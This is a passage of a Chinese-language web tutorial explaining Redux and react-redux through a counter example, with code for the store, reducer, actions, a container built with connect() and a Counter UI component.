createStore(reducer)</span><br></pre></td></tr></table></figure><p>此对象的功能：</p><ul><li>getState(): 得到 state</li><li>dispatch(action): 分发 action, 触发 reducer 调用, 产生新的 state</li><li>subscribe(listener): 注册监听, 当产生了新的 state 时, 自动调用</li></ul><h2 id="count计数案例"><a href="#count计数案例" class="headerlink" title="count计数案例"></a>count计数案例</h2><p>###react实现计数</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span> <span class="comment">// 定义变量</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line">    <span class="comment">// 创建ref，将其赋值给一个变量，通过ref挂载在dom节点或组件上，该ref的current属性将能拿到dom节点或组件的实例</span></span><br><span class="line">    <span class="keyword">this</span>.numberRef = React.createRef()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  increment = <span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="comment">// 同步加</span></span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">state</span> =&gt;</span> (&#123; <span class="attr">count</span>: state.count + number &#125;))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  decrement = <span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="comment">// 同步减</span></span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">state</span> =&gt;</span> (&#123; <span class="attr">count</span>: state.count - number &#125;))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  incrementIfOdd = <span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="comment">// 奇数加</span></span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.state.count % <span class="number">2</span> === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(<span class="function"><span class="params">state</span> =&gt;</span> (&#123; <span class="attr">count</span>: state.count + number &#125;))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  incrementAsync = <span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="comment">// 异步加</span></span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(<span class="function"><span class="params">state</span> =&gt;</span> (&#123; <span class="attr">count</span>: state.count + number &#125;))</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="keyword">this</span>.state.count</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;click &#123;count&#125; times&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class="line"><span class="regexp">            &lt;option value="1"&gt;1&lt;/</span>option&gt;</span><br><span class="line">            &lt;option value=<span class="string">"2"</span>&gt;<span class="number">2</span>&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">            &lt;option value="3"&gt;3&lt;/</span>option&gt;</span><br><span class="line">          &lt;<span class="regexp">/select&gt;&#123;' '&#125;</span></span><br><span class="line"><span class="regexp">          &amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.decrement&#125;&gt;-<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.incrementIfOdd&#125;&gt;increment <span class="keyword">if</span> odd&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">          &amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="react-redux版本"><a href="#react-redux版本" class="headerlink" title="react_redux版本"></a>react_redux版本</h2><p><img src="/view/posts/a8054c2/react-redux%E8%80%A6%E5%90%88.gif" alt="react-redux耦合"></p><p>实现思路：</p><p><img src="/view/posts/a8054c2/react-redux.png" alt="react-redux"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App'</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./redux/store'</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(<span class="xml"><span class="tag">&lt;<span class="name">App</span> <span class="attr">store</span>=<span class="string">&#123;store&#125;/</span>&gt;</span>, document.getElementById('root'))</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">// 给store绑定状态更新的监听</span></span><br><span class="line"><span class="xml">store.subscribe(() =&gt; &#123; // store内部的状态数据发生改变时回调</span></span><br><span class="line"><span class="xml">  // 重新渲染App组件标签</span></span><br><span class="line">  ReactDOM.render(&lt;App store=&#123;store&#125;/&gt;, document.getElementById('root'))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redux/store.js</span></span><br><span class="line"><span class="comment">// redux最核心的管理对象: store</span></span><br><span class="line"><span class="keyword">import</span> &#123;createStore&#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">'./reducer'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createStore(reducer) <span class="comment">// 创建store对象内部会第一次调用reducer()得到初始状态值</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redux/reducer.js</span></span><br><span class="line"><span class="comment">// reducer函数模块: 根据当前state和指定action返回一个新的state</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; INCREMENT, DECREMENT &#125; <span class="keyword">from</span> <span class="string">'./action-types'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 管理count状态数据的reducer</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params">state = <span class="number">1</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'count()'</span>, state, action)</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> INCREMENT:</span><br><span class="line">      <span class="keyword">return</span> state + action.data</span><br><span class="line">    <span class="keyword">case</span> DECREMENT:</span><br><span class="line">      <span class="keyword">return</span> state - action.data</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redux/action-types.js</span></span><br><span class="line"><span class="comment">// 包含n个action type常量名称的模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> INCREMENT = <span class="string">'increment'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> DECREMENT = <span class="string">'decrement'</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// redux/action.js</span></span><br><span class="line"><span class="comment">// 包含n个用来创建action的工厂函数(action creator)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; INCREMENT, DECREMENT &#125; <span class="keyword">from</span> <span class="string">'./action-types'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">增加的action</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> increment = <span class="function"><span class="params">number</span> =&gt;</span> (&#123; <span class="attr">type</span>: INCREMENT, <span class="attr">data</span>: number &#125;)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">减少的action</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> decrement = <span class="function"><span class="params">number</span> =&gt;</span> (&#123; <span class="attr">type</span>: DECREMENT, <span class="attr">data</span>: number &#125;)</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.jsx</span></span><br><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span></span><br><span class="line"><span class="comment">// 引入 actions，在store.dispatch()触发更新</span></span><br><span class="line"><span class="keyword">import</span> &#123;increment, decrement&#125; <span class="keyword">from</span> <span class="string">'./redux/actions'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">    store: PropTypes.object.isRequired</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.numberRef = React.createRef()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  increment = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.props.store.dispatch(increment(number))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  decrement = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.props.store.dispatch(decrement(number))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  incrementIfOdd = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.props.store.getState() % <span class="number">2</span> === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.props.store.dispatch(increment(number))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  incrementAsync = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.props.store.dispatch(increment(number))</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="keyword">this</span>.props.store.getState()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;click &#123;count&#125; times&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">        &lt;div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class="line"><span class="regexp">            &lt;option value="1"&gt;1&lt;/</span>option&gt;</span><br><span class="line">            &lt;option value=<span class="string">"2"</span>&gt;<span class="number">2</span>&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">            &lt;option value="3"&gt;3&lt;/</span>option&gt;</span><br><span class="line">          &lt;<span class="regexp">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.decrement&#125;&gt;-<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.incrementIfOdd&#125;&gt;increment <span class="keyword">if</span> odd&lt;<span class="regexp">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class="line"><span class="regexp">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缺点：</p><p>1) redux 与 react 组件的代码耦合度太高</p><p>2) 编码不够简洁</p><h2 id="react-redux库"><a href="#react-redux库" class="headerlink" title="react-redux库"></a>react-redux库</h2><p>一个 react 插件库，专门用来简化 react 应用中使用 redux。</p><p>React-Redux 将所有组件分成两大类：</p><ul><li>UI 组件<br>a. 只负责 UI 的呈现，不带有任何业务逻辑<br>b. 通过 props 接收数据(一般数据和函数)<br>c. 不使用任何 Redux 的 API<br>d. 一般保存在 components 文件夹下</li><li>容器组件<br>a. 负责管理数据和业务逻辑，不负责 UI 的呈现<br>b. 使用 Redux 的 API<br>c. 一般保存在 containers 文件夹下</li></ul><h3 id="相关api"><a href="#相关api" class="headerlink" title="相关api"></a>相关api</h3><p><strong>Provider</strong>：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 让所有组件都可以得到 state 数据</span></span><br><span class="line">&lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">&lt;App /&gt;</span><br><span class="line">&lt;<span class="regexp">/Provider&gt;</span></span><br></pre></td></tr></table></figure><p><strong>connect()</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用于包装 UI 组件生成容器组件</span></span><br><span class="line">connect(</span><br><span class="line">mapStateToprops,</span><br><span class="line">mapDispatchToProps</span><br><span class="line">)(Counter)</span><br></pre></td></tr></table></figure><p><strong>mapStateToprops()</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数: 将 state 数据转换为 UI 组件的标签属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapStateToProps</span> (<span class="params">state</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">    count: state</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>mapDispatchToProps</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数: 将分发 action 的函数转换为 UI 组件的标签属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mapDispatchToProps</span>(<span class="params">dispatch</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">    increment: <span class="function">(<span class="params">number</span>) =&gt;</span> dispatch(increment(number)),</span><br><span class="line">    decrement: <span class="function">(<span class="params">number</span>) =&gt;</span> dispatch(decrement(number)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对象: 简洁语法, 可以直接指定包含多个 action 方法</span></span><br><span class="line"><span class="keyword">const</span> mapDispatchToProps = &#123;</span><br><span class="line">    increment,</span><br><span class="line">    decrement</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="react-redux版本-1"><a href="#react-redux版本-1" class="headerlink" title="react-redux版本"></a>react-redux版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">npm install --save react-redux</span><br><span class="line"></span><br><span class="line">redux/action-types.js 不变</span><br><span class="line">redux/actions.js 不变</span><br><span class="line">redux/reducers.js 不变</span><br><span class="line">redux/store.js 不变</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// containers/App.js</span></span><br><span class="line"><span class="keyword">import</span> &#123;connect&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"><span class="keyword">import</span> Counter <span class="keyword">from</span> <span class="string">'../components/Counter'</span></span><br><span class="line"><span class="keyword">import</span> &#123;increment, decrement&#125; <span class="keyword">from</span> <span class="string">'../redux/actions'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 指定向Counter传入哪些一般属性(属性值的来源就是store中的state)</span></span><br><span class="line"><span class="comment">const mapStateToProps = (state) =&gt; (&#123;count: state&#125;)</span></span><br><span class="line"><span class="comment">// 指定向Counter传入哪些函数属性</span></span><br><span class="line"><span class="comment">// 如果是函数, 会自动调用得到对象, 将对象中的方法作为函数属性传入UI组件</span></span><br><span class="line"><span class="comment">const mapDispatchToProps = (dispatch) =&gt; (&#123;</span></span><br><span class="line"><span class="comment">  increment: (number) =&gt; dispatch(increment(number)),</span></span><br><span class="line"><span class="comment">  decrement: (number) =&gt; dispatch(decrement(number)),</span></span><br><span class="line"><span class="comment">&#125;)</span></span><br><span class="line"><span class="comment">// 如果是对象, 将对象中的方法包装成一个新函数, 并传入UI组件</span></span><br><span class="line"><span class="comment">// const mapDispatchToProps = &#123;increment, decrement&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">export default connect(</span></span><br><span class="line"><span class="comment">  mapStateToProps,</span></span><br><span class="line"><span class="comment">  mapDispatchToProps</span></span><br><span class="line"><span class="comment">)(Counter)*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(</span><br><span class="line">  state =&gt; (&#123;<span class="attr">count</span>: state&#125;),</span><br><span class="line">  &#123;increment, decrement&#125;,</span><br><span class="line">)(Counter)</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// components/Counter.jsx</span></span><br><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">UI组件</span></span><br><span class="line"><span class="comment">  主要做显示与与用户交互</span></span><br><span class="line"><span class="comment">  代码中没有任何redux相关的代码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Counter</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">    count: PropTypes.number.isRequired,</span><br><span class="line">    increment: PropTypes.func.isRequired,</span><br><span class="line">    decrement: PropTypes.func.isRequired</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line">    <span class="keyword">this</span>.numberRef = React.createRef()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  increment = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.props.increment(number)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  decrement = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.props.decrement(number)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  incrementIfOdd = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.props.count % <span class="number">2</span> === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.props.increment(number)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  incrementAsync = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> number = <span class="keyword">this</span>.numberRef.current.value * <span class="number">1</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.props.increment(number)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="keyword">this</span>.props.count</span><br><span 